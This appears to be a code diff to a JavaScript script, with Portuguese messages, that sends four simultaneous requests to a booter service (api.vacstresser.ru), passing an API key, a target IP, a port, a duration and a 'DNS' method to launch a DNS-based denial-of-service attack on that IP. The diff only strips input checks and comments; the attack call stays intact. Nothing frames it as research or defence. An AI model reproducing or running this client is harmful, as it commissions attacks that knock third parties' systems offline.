@@ -54,16 +54,6 @@ async function clear() {
 }
 
 async function sendApiRequest(ip) {
-    if (!token || token.trim() === '') {
-        console.error('Token inválido. Por favor, forneça um token válido.');
-        return; // Para a execução da função
-    }
-
-    if (!ip || ip.trim() === '') {
-        console.error('IP inválido. Por favor, forneça um IP válido.');
-        return; // Para a execução da função
-    }
-    
     const url = `https://api.vacstresser.ru/api?key=${token}&ip=${ip}&port=80&time=30&method=DNS`;
     console.log(`URL da API: ${url}`);
     const requests = Array(4).fill(url).map(u => axios.get(u));
@@ -72,9 +62,7 @@ async function sendApiRequest(ip) {
         await axios.all(requests);
         console.log(`Requisição enviada para o IP: ${ip}`);
     } catch (error) {
-        // Verifica se há uma resposta de erro
         if (error.response) {
-            // O erro tem uma resposta com dados
             const status = error.response.data.status;
             const errorMessage = error.response.data.message || 'Mensagem de erro não disponível';
             if (status === 'error') {
@@ -83,10 +71,8 @@ async function sendApiRequest(ip) {
                 console.log(`Resposta da API para o IP: ${ip}. Status: ${status}`);
             }
         } else if (error.request) {
-            // A requisição foi feita, mas não houve resposta
             console.error(`Erro ao enviar requisição para o IP: ${ip}. Sem resposta da API.`);
         } else {
-            // Erro ao configurar a requisição
             console.error(`Erro ao configurar a requisição para o IP: ${ip}. Mensagem: ${error.message}`);
         }
     }
